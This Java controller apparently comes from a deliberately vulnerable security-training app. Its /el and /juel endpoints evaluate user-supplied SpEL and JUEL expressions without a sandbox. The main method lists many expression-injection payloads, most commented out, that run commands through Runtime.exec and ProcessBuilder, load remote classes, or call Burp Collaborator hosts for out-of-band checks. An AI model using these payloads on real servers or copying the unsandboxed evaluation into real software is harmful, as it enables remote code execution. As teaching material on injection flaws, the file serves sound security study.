package org.joychou.controller;

import org.flowable.common.engine.api.variable.VariableContainer;
import org.flowable.engine.impl.el.ProcessExpressionManager;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.el.ELProcessor;
import java.io.IOException;


@RestController
public class EL {

    @RequestMapping("/el")
    public String el(String expression) {
        ExpressionParser parser = new SpelExpressionParser();
        // fix method: SimpleEvaluationContext
        return parser.parseExpression(expression).getValue().toString();
    }

    @RequestMapping("/juel")
    public String juel(String expression) {
//        String payload = "${''.getClass().forName('jdk.jshell.JShell').getMethod('create').invoke(null).eval('java.lang.Runtime.getRuntime().exec(\"notepad\")')}";


        Object result = new ProcessExpressionManager().createExpression(expression).getValue(new VariableContainer() {
            @Override
            public boolean hasVariable(String s) {
                return false;
            }

            @Override
            public Object getVariable(String s) {
                return null;
            }

            @Override
            public void setVariable(String s, Object o) {

            }

            @Override
            public void setTransientVariable(String s, Object o) {

            }

            @Override
            public String getTenantId() {
                return null;
            }
        });

        return result.toString();
    }

    public static void main(String[] args) throws IOException, ClassNotFoundException {
//        String payload = "''.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('ping 1uwnjnqpo6cyg9g825afrsvunltphe.burpcollaborator.net')\")";
//        String payload = "''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('calc.exe')";
//        String payload = "''.getClass().forName('java.net.InetAddress').getMethod('getByName',''.getClass()).invoke('','ylnkakhmf33v7675t21cipmreikl8a.burpcollaborator.net')";
//        String payload = "\"\".getClass().forName(\"java.lang.ProcessBuilder\").getDeclaredConstructors()[0].newInstance([\"ping\",\"p0qbpbwduuimmxmw8tg3xg1it9zen3.burpcollaborator.net\"]).start()";
        String payload = "${\"\".getClass().forName(\"java.net.InetAddress\").getMethod(\"getByName\",\"\".getClass()).invoke(\"\",\"if1444b69nxf1q1pnmvwc9gb82e12q.burpcollaborator.net\")}\n";
//        String payload = "\"\".getClass().forName(\"java.net.InetSocketAddress\").getDeclaredConstructors()[2].newInstance([\"uqoimkc58pr8g1oe5i7ai71lyc4bs0.burpcollaborator.net\",80])";
//        String payload = "\"\".getClass().forName(\"java.net.Socket\").getDeclaredConstructors()[9].newInstance(\"uqoimkc58pr8g1oe5i7ai71lyc4bs0.burpcollaborator.net\",Integer.valueOf(80))";
//        String payload = "\"\".getClass().forName(\"org.yaml.snakeyaml.Yaml\").getDeclaredConstructors()[6].newInstance().load(\"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://ej12f45p19ks9lhyy20ubru5rwxwll.burpcollaborator.net/Yaml']]]]\")";
//        String payload = "\"\".getClass().forName(\"java.lang.ProcessBuilder\").getDeclaredConstructors()[0].newInstance([\"ping\",\"t3xhzjp4lo47t01dihk9v6ekbbhc51.burpcollaborator.net\"]).start()";
//        String payload = "''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"java.lang.Runtime.getRuntime().exec('ping s0tgwim3in16qzycfgh8s5bj8aee23.burpcollaborator.net')\")";
//        String payload = "''.getClass().forName('java.net.URL').getDeclaredConstructors()[2].newInstance('http://kl98ha7v3fmybrj40820dxwbt2ztvhk.burpcollaborator.net/URL').openStream()";
//        String payload = "''.getClass().forName('jdk.jshell.JShell').getMethod('create').invoke(null).eval('java.lang.Runtime.getRuntime().exec(\"calc\")')";

//        String payload = "''.getClass().forName('jdk.jshell.JShell').getMethod('create').invoke(null).eval('new java.lang.ProcessBuilder().command(\"cmd /c calc\".split(\" \")).start()')";

        // 调用loadClass之前不会发出http请求，调用之后才发出。
//        new URLClassLoader(new URL[]{new URL("http://bp4zl1bm76qpfinv4z6rho02xt3kw8l.burpcollaborator.net")}, "".getClass().getClassLoader()).loadClass("EvilBB01");

//        String[] payloads = new String[]{
//                "''.getClass().forName('java.net.URL').getDeclaredConstructors()[0].toString()",
//                "''.getClass().forName('java.net.URL').getDeclaredConstructors()[1].toString()",
//                "''.getClass().forName('java.net.URL').getDeclaredConstructors()[2].toString()",
//                "''.getClass().forName('java.net.URL').getDeclaredConstructors()[3].toString()",
//                "''.getClass().forName('java.net.URL').getDeclaredConstructors()[4].toString()",
//                "''.getClass().forName('java.net.URL').getDeclaredConstructors()[5].toString()",
//                "''.getClass().forName('java.net.URL').getDeclaredConstructors()[6].toString()",
//                "''.getClass().forName('java.net.URL').getDeclaredConstructors()[7].toString()",
//                "''.getClass().forName('java.net.URL').getDeclaredConstructors()[8].toString()",
//                "''.getClass().forName('java.net.URL').getDeclaredConstructors()[9].toString()",
//        };
        ELProcessor processor = new ELProcessor();
//
////        String payload = "''.getClass().forName('org.yaml.snakeyaml.Yaml').getDeclaredConstructors()[0].toString()";
//        for (int i = 0; i < payloads.length; i++) {
//            System.out.println(processor.eval(payloads[i]).toString());
//        }

//        System.out.println(processor.eval(payload).toString());

//        (new java.io.FileOutputStream("/home/cqq/result.txt")).write((new java.lang.ProcessBuilder("ls","-al").start().getInputStream().readAllBytes()));
//        new java.lang.ProcessBuilder("cmd","/c","calc").start();
//        List<SnippetEvent> eval = JShell.create().eval();
//        Process process = (Process) processor.eval(payload);
//        InputStream inputStream = process.getInputStream();
//        StringBuilder stringBuilder2 = new StringBuilder();
//        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
//        String line;
//        while((line = bufferedReader.readLine()) != null) {
//            stringBuilder2.append(line).append("\n");
//        }
//
//        String result = stringBuilder2.toString();
//        System.out.println(result);
    }
}


